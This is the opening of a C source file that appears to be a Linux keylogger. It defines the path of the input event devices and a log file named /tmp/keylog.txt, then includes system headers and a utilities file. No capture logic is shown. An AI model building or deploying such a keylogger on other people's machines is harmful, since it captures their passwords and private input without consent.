
/*
//
// defining variables
//
*/

#define INPUT_EVENT_DIR "/dev/input/by-path/"
#define LOG_FILE "/tmp/keylog.txt"

/*
//
// importing system headers
//
*/

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/*
//
// importing utility functions
//
*/

#include "utils.c"
